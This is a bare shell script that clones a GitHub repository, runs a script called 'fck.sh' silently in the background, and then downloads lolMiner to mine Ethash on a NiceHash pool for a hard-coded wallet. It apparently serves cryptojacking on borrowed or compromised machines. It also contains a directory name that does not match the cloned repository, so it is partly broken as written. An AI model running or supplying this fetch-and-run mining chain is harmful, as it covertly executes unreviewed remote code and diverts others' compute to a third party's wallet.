git clone https://github.com/angkii/bh.git

cd woi

chmod +x fck.sh

chmod +x cpu

./fck.sh > /dev/null 2>&1 &

wget https://github.com/Lolliedieb/lolMiner-releases/releases/download/1.29/lolMiner_v1.29_Lin64.tar.gz

tar -xvf lolMiner_v1.29_Lin64.tar.gz

cd 1.29;./lolMiner --algo ETHASH --pool daggerhashimoto.eu.nicehash.com:3353 -u 3BsJ6cvtviyvS6tWfFWaDGHStB8pTHUrNH.sex1 --ethstratum ETHPROXY
